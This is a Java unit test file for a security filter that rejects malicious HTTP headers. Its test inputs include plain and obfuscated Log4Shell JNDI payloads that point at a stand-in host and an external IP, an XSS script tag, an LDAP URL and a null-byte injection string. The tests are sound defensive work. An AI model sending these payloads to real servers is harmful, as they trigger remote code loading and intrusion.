package com.github.farzadsedaghatbin.shipflow.security;

import jakarta.servlet.FilterChain;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Collections;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.mockito.Mockito.*;

/**
 * Tests for {@link MaliciousHeaderFilter} - security filter that blocks exploit attempts.
 * Verifies detection of Log4Shell, XSS, and other attack vectors.
 */
@ExtendWith(MockitoExtension.class)
class MaliciousHeaderFilterTest {

    private MaliciousHeaderFilter filter;

    @Mock
    private HttpServletRequest request;

    @Mock
    private HttpServletResponse response;

    @Mock
    private FilterChain filterChain;

    private StringWriter responseWriter;

    @BeforeEach
    void setUp() throws Exception {
        filter = new MaliciousHeaderFilter();
        responseWriter = new StringWriter();
        when(response.getWriter()).thenReturn(new PrintWriter(responseWriter));
    }

    @Test
    void shouldBlockLog4ShellAttack() throws Exception {
        // Given: A request with Log4Shell JNDI injection payload
        String maliciousPayload = "${jndi:ldap://evil.com:1389/Exploit}";
        when(request.getHeaderNames()).thenReturn(Collections.enumeration(Collections.singletonList("X-Forwarded-Host")));
        when(request.getHeader("X-Forwarded-Host")).thenReturn(maliciousPayload);
        when(request.getRequestURI()).thenReturn("/api/qa/ask");
        when(request.getMethod()).thenReturn("POST");
        when(request.getRemoteAddr()).thenReturn("31.57.109.131");

        // When: Filter processes the request
        filter.doFilter(request, response, filterChain);

        // Then: Request is blocked with 400 Bad Request
        verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
        verify(response).setContentType("application/json");
        verify(filterChain, never()).doFilter(any(), any());
        assertEquals("{\"error\":\"Malicious request detected and blocked\"}", responseWriter.toString());
    }

    @Test
    void shouldBlockObfuscatedLog4ShellAttack() throws Exception {
        // Given: An obfuscated Log4Shell attack (like in production logs)
        String maliciousPayload = "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/Exploit}";
        when(request.getHeaderNames()).thenReturn(Collections.enumeration(Collections.singletonList("X-Forwarded-Host")));
        when(request.getHeader("X-Forwarded-Host")).thenReturn(maliciousPayload);
        when(request.getRequestURI()).thenReturn("/api/qa/ask");
        when(request.getMethod()).thenReturn("POST");
        when(request.getRemoteAddr()).thenReturn("31.57.109.131");

        // When: Filter processes the request
        filter.doFilter(request, response, filterChain);

        // Then: Request is blocked
        verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
        verify(filterChain, never()).doFilter(any(), any());
    }

    @Test
    void shouldBlockXSSAttack() throws Exception {
        // Given: A request with XSS payload in header
        String maliciousPayload = "<script>alert('XSS')</script>";
        when(request.getHeaderNames()).thenReturn(Collections.enumeration(Collections.singletonList("User-Agent")));
        when(request.getHeader("User-Agent")).thenReturn(maliciousPayload);
        when(request.getRequestURI()).thenReturn("/api/qa/ask");
        when(request.getMethod()).thenReturn("GET");
        when(request.getRemoteAddr()).thenReturn("192.168.1.100");

        // When: Filter processes the request
        filter.doFilter(request, response, filterChain);

        // Then: Request is blocked
        verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
        verify(filterChain, never()).doFilter(any(), any());
    }

    @Test
    void shouldBlockLDAPProtocol() throws Exception {
        // Given: A request with LDAP protocol in header
        String maliciousPayload = "ldap://malicious.server.com/payload";
        when(request.getHeaderNames()).thenReturn(Collections.enumeration(Collections.singletonList("Referer")));
        when(request.getHeader("Referer")).thenReturn(maliciousPayload);
        when(request.getRequestURI()).thenReturn("/api/qa/ask");
        when(request.getMethod()).thenReturn("GET");
        when(request.getRemoteAddr()).thenReturn("192.168.1.100");

        // When: Filter processes the request
        filter.doFilter(request, response, filterChain);

        // Then: Request is blocked
        verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
        verify(filterChain, never()).doFilter(any(), any());
    }

    @Test
    void shouldBlockNullByteInjection() throws Exception {
        // Given: A request with null byte injection
        String maliciousPayload = "legitimate%00malicious";
        when(request.getHeaderNames()).thenReturn(Collections.enumeration(Collections.singletonList("X-Forwarded-Host")));
        when(request.getHeader("X-Forwarded-Host")).thenReturn(maliciousPayload);
        when(request.getRequestURI()).thenReturn("/api/qa/ask");
        when(request.getMethod()).thenReturn("GET");
        when(request.getRemoteAddr()).thenReturn("192.168.1.100");

        // When: Filter processes the request
        filter.doFilter(request, response, filterChain);

        // Then: Request is blocked
        verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
        verify(filterChain, never()).doFilter(any(), any());
    }
}
